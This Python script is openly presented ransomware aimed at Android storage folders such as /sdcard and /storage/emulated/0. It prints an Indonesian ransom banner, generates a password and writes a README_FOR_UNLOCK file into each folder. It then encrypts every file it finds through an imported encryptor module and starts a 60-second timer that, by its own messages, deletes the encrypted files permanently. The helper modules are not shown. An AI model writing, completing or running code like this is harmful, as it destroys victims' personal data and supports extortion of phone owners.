import os
import time
from encryptor import *
from timer import start_timer

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    print("\033[91m")
    print("███▀▀▀██ ███▀▀▀██ ██▀▀▀▀▀▀█ ██▀▀▀▀▀▀█ ██▀▀▀▀▀▀█")
    print("██    ██ ██    ██ ██       ██       ██       ")
    print("██    ██ ██    ██ ██▀▀▀▀█▄ ██▀▀▀▀█▄ ████████▄ ")
    print("██    ██ ██    ██ ██    ██ ██    ██ ██     ██")
    print("██▄▄▄▄██ ██▄▄▄███ ██▄▄▄▄██ ██▄▄▄▄██ ██▄▄▄▄▄██\033[0m")
    print("\n\033[93m⚠️  FILE-FILE KAMU TELAH TERENKRIPSI!")
    print("⏳ WAKTU 60 DETIK UNTUK MENGEMBALIKAN SEBELUM DIHAPUS PERMANEN!")
    print("📄 LIHAT FILE: README_FOR_UNLOCK.txt di setiap folder!\033[0m\n")

def main():
    clear()
    banner()

    target_folders = [
        "/sdcard",
        "/storage",
        "/storage/emulated/0"
    ]

    password = generate_password()
    print(f"🔑 PASSWORD: \033[92m{password}\033[0m")

    for folder in target_folders:
        if not os.path.exists(folder):
            print(f"❌ Tidak ditemukan: {folder}")
            continue

        print(f"\n📂 Enkripsi folder: {folder}")
        try:
            write_warning_file(folder, password)
            files = get_all_files(folder)
            for f in files:
                if encrypt_file(f, password):
                    print(f"✅ Enkripsi: {f}")
        except Exception as e:
            print(f"⚠️ Gagal enkripsi di {folder}: {e}")

    print("\n🕒 Hitung mundur: 60 detik...")
    for folder in target_folders:
        if os.path.exists(folder):
            start_timer(60, folder)
    print("\n💀 Selesai. Semua file terenkripsi telah dihapus jika tidak didekripsi.")
    
if __name__ == "__main__":
    main()
